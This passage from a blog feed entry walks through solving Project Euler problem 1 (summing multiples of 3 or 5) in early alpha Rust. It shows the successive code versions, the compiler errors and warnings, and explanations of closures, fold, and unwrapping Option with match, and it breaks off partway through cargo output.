</summary><category term="[]"></category></entry><entry><title>Solving Project Euler with Rust 1</title><link href="http://unlogic.co.uk/2015/01/12/solving-project-euler-with-rust-1/" rel="alternate"></link><updated>2015-01-13T20:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-01-12:2015/01/12/solving-project-euler-with-rust-1/</id><summary type="html">&lt;p&gt;It's time to poke at &lt;a class="reference external" href="http://www.rust-lang.org/"&gt;Rust&lt;/a&gt; a little bit. And what
better way to get acquainted with a new language than to solve
some problems with it? And seeing as there's not always a suitably
simple problem handy, I've picked some problems from &lt;a class="reference external" href="https://projecteuler.net"&gt;Project Euler&lt;/a&gt;
to tackle. I am using Rust 1.0.0Alpha in this post.&lt;/p&gt;
&lt;p&gt;The first problem is:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Multiples of 3 and 5
Problem 1
If we list all the natural numbers below 10 that are multiples of 3 or 5,
we get 3, 5, 6 and 9. The sum of these multiples is 23.&lt;/p&gt;
&lt;p&gt;Find the sum of all the multiples of 3 or 5 below 1000.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ok, so sounds fairly ok and I'm going to add another requirement: To prompt the
user for the max number (in this case the 1000). Just a little extra exercise. I've
read the &lt;a class="reference external" href="http://rustbyexample.com/"&gt;Rust By Example&lt;/a&gt; pages and the new and official
&lt;a class="reference external" href="http://doc.rust-lang.org/1.0.0-alpha/book"&gt;Rust book&lt;/a&gt; and let's see how we get on.&lt;/p&gt;
&lt;p&gt;First let's define some structure:&lt;/p&gt;
&lt;pre class="code rust literal-block"&gt;
&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_num&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;max_num&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;

&lt;/span&gt;&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="n"&gt;println&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Total sum: {}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;cargo run&lt;/code&gt; simply prints out &lt;code&gt;Total sum: 10&lt;/code&gt;. That's what we expect. I use &lt;code&gt;let result = 10;&lt;/code&gt;
because I will be putting the result into a variable. The &lt;code&gt;result&lt;/code&gt; with the semicolon
omitted is our return value. So far, so good.&lt;/p&gt;
&lt;p&gt;Let's try to sum up the relevant numbers with a hard coded max value of 10.&lt;/p&gt;
&lt;pre class="code rust literal-block"&gt;
&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_num&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;numbers&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;max_num&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="n"&gt;numbers&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fold&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;acc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;acc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;

&lt;/span&gt;&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="n"&gt;println&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Total sum: {}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Looks fun, right? So what's going on? First we generate a range iterator of numbers
divisible by 3 and 5. Pay attention to the &lt;code&gt;*i&lt;/code&gt; which we need to use because the
filter value &lt;code&gt;i&lt;/code&gt; is of type &lt;code&gt;&amp;amp;i32&lt;/code&gt; and without it Rust handily tells you the same:&lt;/p&gt;
&lt;blockquote&gt;
error: binary operation &lt;code&gt;%&lt;/code&gt; cannot be applied to type &lt;code&gt;&amp;amp;i32&lt;/code&gt;&lt;/blockquote&gt;
&lt;p&gt;Next we use &lt;cite&gt;fold&lt;/cite&gt; to sum all the entries. The &lt;a class="reference external" href="http://doc.rust-lang.org/1.0.0-alpha/core/iter/trait.IteratorExt.html#method.fold"&gt;docs&lt;/a&gt;
explain fold like this:&lt;/p&gt;
&lt;blockquote&gt;
Performs a fold operation over the entire iterator, returning the eventual
state at the end of the iteration.&lt;/blockquote&gt;
&lt;p&gt;In this case we can liken it to Python's &lt;code&gt;map&lt;/code&gt; function if you like, but a little different.
The first argument is the initial value that gets assigned to &lt;code&gt;acc&lt;/code&gt;. Then the result of &lt;code&gt;acc + x&lt;/code&gt;
gets assigned to &lt;code&gt;acc&lt;/code&gt; to each entry &lt;code&gt;x&lt;/code&gt;. Ultimately it's a &lt;code&gt;sum&lt;/code&gt; in Python world.&lt;/p&gt;
&lt;p&gt;Functionally we're done. The problem is solved as far as the initial requirement are concerned.
But I want to add some user input, so let's go over that part next.&lt;/p&gt;
&lt;pre class="code rust literal-block"&gt;
&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_num&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;numbers&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;max_num&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="n"&gt;numbers&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fold&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;acc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;acc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;

&lt;/span&gt;&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Enter the max number: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;read_line&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;ok&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;expect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Failed to read line&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;input_num&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;Option&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;trim&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;parse&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;

    &lt;/span&gt;&lt;span class="n"&gt;println&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Total sum: {}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;input_num&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;We read the user input and make sure it was read ok (this is explained in detail in the book)
then we convert the input to &lt;code&gt;i32&lt;/code&gt;. The &lt;code&gt;trim&lt;/code&gt; is required to remove the newline char
at the nd of the input and the &lt;code&gt;parse&lt;/code&gt; does the conversion.&lt;/p&gt;
&lt;p&gt;But if we try to run this we get the following error:&lt;/p&gt;
&lt;blockquote&gt;
error: mismatched types: expected &lt;code&gt;i32&lt;/code&gt;, found &lt;code&gt;core::option::Option&amp;lt;i32&amp;gt;&lt;/code&gt;
(expected i32, found enum core::option::Option)&lt;/blockquote&gt;
&lt;p&gt;Right, because it's still an &lt;code&gt;Option&amp;lt;i32&amp;gt;&lt;/code&gt; type. Helpfully the book explains that we need to
unwrap the &lt;code&gt;Option&lt;/code&gt;, and the best way to do this is with &lt;code&gt;match&lt;/code&gt;:&lt;/p&gt;
&lt;pre class="code rust literal-block"&gt;
&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_num&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;numbers&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;max_num&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="n"&gt;numbers&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fold&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;acc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;acc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;

&lt;/span&gt;&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Enter the max number: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;read_line&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;ok&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;expect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Failed to read line&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;input_num&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;Option&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;trim&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;parse&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;

    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;match&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;input_num&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="nb"&gt;Some&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="nb"&gt;None&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
            &lt;/span&gt;&lt;span class="n"&gt;println&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Please input a number!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
            &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;&lt;span class="w"&gt;

    &lt;/span&gt;&lt;span class="n"&gt;println&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Total sum: {}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Let's run this and see what happens:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;ninja:euler_1 unlogic$&lt;/span&gt; cargo run
&lt;span class="go"&gt;   Compiling euler_1 v0.0.1 (file:///work/code/rust/euler/euler_1)
/work/code/rust/euler/euler_1/src/main.rs:2:19: 2:24 warning: use of unstable item: will be replaced by range notation, #[warn(unstable)] on by default
/work/code/rust/euler/euler_1/src/main.rs:2     let numbers = range(1, max_num).filter(|i| *i % 3 == 0 || *i % 5 == 0);
                                                              ^~~~~
/work/code/rust/euler/euler_1/src/main.rs:8:34: 8:45 warning: use of unstable item, #[warn(unstable)] on by default
/work/code/rust/euler/euler_1/src/main.rs:8     let input = std::io::stdin().read_line().ok().expect(&amp;quot;Failed to read line&amp;quot;);
                                                                             ^~~~~~~~~~~
/work/code/rust/euler/euler_1/src/main.rs:8:17: 8:31 warning: use of unstable item, #[warn(unstable)] on by default
/work/code/rust/euler/euler_1/src/main.rs:8     let input = std::io::stdin().read_line().ok().expect(&amp;quot;Failed to read line&amp;quot;);
                                                            ^~~~~~~~~~~~~~
/work/code/rust/euler/euler_1/src/main.rs:9:47: 9:54 warning: use of unstable item: this method was just created, #[warn(unstable)] on by default
/work/code/rust/euler/euler_1/src/main.rs:9     let input_num: Option&amp;lt;i32&amp;gt; = input.trim().parse();
                                                                                          ^~~~~~~
